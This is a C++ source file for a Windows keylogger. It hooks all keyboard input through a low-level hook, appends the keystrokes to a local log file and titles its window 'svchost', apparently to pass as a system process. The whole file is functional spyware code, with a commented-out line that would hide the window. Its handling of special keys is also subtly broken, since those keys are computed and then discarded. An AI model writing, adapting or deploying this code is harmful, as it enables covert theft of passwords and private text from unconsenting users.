// KeyLogger.cpp : Defines the entry point for the application.
//
#include "pch.h"

static const wchar_t g_windowTitle[] = L"svchost";

HHOOK	kbdhook;	/* Keyboard hook handle */
bool	running;	/* Used in main loop */

static const char g_filePath[] = "F:/tmp/keys.log";

// return true if key is printable
bool KeyNameToString(const KBDLLHOOKSTRUCT& stHook, std::string& str) {
	DWORD msg = 1;
	msg += (stHook.scanCode << 16);
	msg += (stHook.flags << 24);	
	char tmp[0xFF] = {};
	GetKeyNameTextA(msg, tmp, 0xFF);
	str = tmp;
	return strlen(tmp) <= 1;
}

std::string GetNonPrintableKeyString(const std::string& str, bool& capslock, bool& shift) {
	bool printable = false;
	if (str == "Capslock"){
		capslock = !capslock;
	}
	else if (str == "Shift") {
		shift = true;
	}

	/*
		* Keynames that may become printable characters are
		* handled here.
		*/
	if (str == "Enter") {
		return "\n";
	}
	else if (str == "Space") {
		return " ";
	}
	else if (str == "Tab") {
		return "\t";
	}
	else {
		return ("[" + str + "]");
	}
}
__declspec(dllexport) LRESULT CALLBACK HandleKeys(int code, WPARAM wp, LPARAM lp)
{
	static bool capslock = false;
	static bool shift = false;
	KBDLLHOOKSTRUCT& stHook = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lp);
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		std::string str;
		bool printable = KeyNameToString(stHook, str);

		/*
		 * Non-printable characters only:
		 * Some of these (namely; newline, space and tab) will be
		 * made into printable characters.
		 * Others are encapsulated in brackets ('[' and ']').
		 */
		if (!printable) {
			str = GetNonPrintableKeyString(str, capslock, shift);
			str = "";
		}
		else {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}
		}

		std::ofstream outfile(g_filePath, std::ios_base::app);
		outfile << str;
	}
	else if (code == HC_ACTION && (wp == WM_SYSKEYUP || wp == WM_KEYUP)) {
		std::string str;
		bool printable = KeyNameToString(stHook, str);
		if (str == "Shift") {
			shift = false;
		}
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}

LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_CLOSE: case WM_DESTROY:
		running = false;
		break;
	default:
		/* Call default message handler */
		return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
	LPSTR cmdline, int ncmdshow)
{
	/*
	 * Set up window
	 */
	HWND fgwindow = GetForegroundWindow(); /* Current foreground window */
	WNDCLASSEX	windowclass;
	std::wstring className = L"winkey";
	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = className.c_str();
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_BACKGROUND);

	if (!(RegisterClassEx(&windowclass)))
		return 1;

	HWND hwnd = CreateWindowEx(NULL, className.c_str(), g_windowTitle, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		thisinstance, NULL);
	if (!(hwnd))
		return 1;


	//ShowWindow(hwnd, SW_HIDE);
	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Set focus to the previous foreground window */


	HINSTANCE modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(HandleKeys), modulehandle, NULL);

	running = true;

	/*
	 * Main loop
	 */
	while (running) {
		/*
		 * dispatch messages to window procedure
		 */
		MSG msg = {};
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
